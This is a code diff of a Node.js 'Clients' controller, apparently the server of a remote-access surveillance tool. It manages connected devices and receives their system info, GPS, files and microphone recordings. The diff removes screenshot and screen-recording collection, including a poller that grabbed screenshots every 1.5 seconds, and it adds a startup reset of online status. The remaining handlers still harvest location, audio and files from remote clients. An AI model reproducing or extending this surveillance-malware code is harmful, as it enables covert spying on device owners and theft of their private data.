@@ -11,6 +11,12 @@ class Clients {
         this.ignoreDisconnects = {};
         this.instance = this;
         this.db = db;
+
+        // Reset all clients to offline on startup
+        this.db.maindb.get('clients').value().forEach((client) => {
+            client.isOnline = false;
+        });
+        this.db.maindb.write();
     }
 
     // UPDATE
@@ -252,67 +258,10 @@ class Clients {
             }
         });
 
-        socket.on(CONST.messageKeys.screenshot, (data) => {
-            if (data.file) {
-                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
-
-                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
-                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
-                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.png';
-
-                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
-
-                fs.writeFile(filePath, data.buffer, (e) => {
-                    if (!e) {
-                        client.get('downloads').push({
-                            "time": new Date(),
-                            "type": "screenshot",
-                            "originalName": data.name,
-                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
-                        }).write();
-                        client.get('latestScreenshot').assign(CONST.downloadsFolder + '/' + fileKey + fileExt).write();
-                        logManager.log(CONST.logTypes.success, "Screenshot From" + clientID + " Saved");
-                    } else {
-                        console.log(e);
-                    }
-                })
-            } else if (data.error) {
-                logManager.log(CONST.logTypes.error, clientID + " Screenshot Error - " + data.error);
-            }
-        });
-
         socket.on(CONST.messageKeys.systeminfo, (data) => {
             client.get('systemInfo').remove().write();
             client.get('systemInfo').assign(data).write();
             logManager.log(CONST.logTypes.success, clientID + " System Info Updated");
-        });
-
-        socket.on(CONST.messageKeys.screenrecord, (data) => {
-            if (data.file) {
-                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
-
-                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
-                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
-                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.mp4';
-
-                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
-
-                fs.writeFile(filePath, data.buffer, (e) => {
-                    if (!e) {
-                        client.get('downloads').push({
-                            "time": new Date(),
-                            "type": "screenrecord",
-                            "originalName": data.name,
-                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
-                        }).write();
-                        logManager.log(CONST.logTypes.success, "Screenrecord From" + clientID + " Saved");
-                    } else {
-                        console.log(e);
-                    }
-                })
-            } else if (data.error) {
-                logManager.log(CONST.logTypes.error, clientID + " Screenrecord Error - " + data.error);
-            }
         });
 
         socket.on(CONST.messageKeys.location, (data) => {
@@ -474,8 +423,6 @@ class Clients {
             else if (page === "files") pageData = clientData.currentFolder;
             else if (page === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
             else if (page === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
-            else if (page === "screenshots") pageData = clientDB.get('downloads').value().filter(download => download.type === "screenshot");
-            else if (page === "screenrecordings") pageData = clientDB.get('downloads').value().filter(download => download.type === "screenrecord");
             else if (page === "gps") pageData = clientData.GPSData;
             else if (page === "info") {
                 pageData = client;
@@ -556,23 +503,12 @@ class Clients {
                     if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                     else return cb(false);
                 }
-                else if (commandPayload.action === 'sc') {
-                    return cb(false);
-                }
                 else return cb('Files `action` parameter incorrect');
             }
         }
         else if (commandID === CONST.messageKeys.mic) {
             if (!'sec' in commandPayload) return cb('Mic Missing `sec` Parameter')
             else cb(false)
-        }
-        else if (commandID === CONST.messageKeys.screenrecord) {
-            if (!('sec' in commandPayload)) return cb('ScreenRecord Missing `sec` Parameter')
-            else {
-                let s = parseInt(commandPayload.sec);
-                if (isNaN(s) || s < 5 || s > 60) return cb('ScreenRecord `sec` must be 5-60')
-                else cb(false)
-            }
         }
 
         else if (commandID === CONST.messageKeys.input) {
@@ -604,14 +540,6 @@ class Clients {
                 this.sendCommand(clientID, '0xLO')
             }, gpsSettings.updateFrequency * 1000);
         }
-    }
-
-    screenshotPoll(clientID) {
-        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
-        this.gpsPollers[clientID] = setInterval(() => {
-            logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - SCREENSHOT");
-            this.sendCommand(clientID, CONST.messageKeys.files, { action: 'sc' }, () => { });
-        }, 1500);
     }
 
     setGpsPollSpeed(clientID, pollevery, cb) {
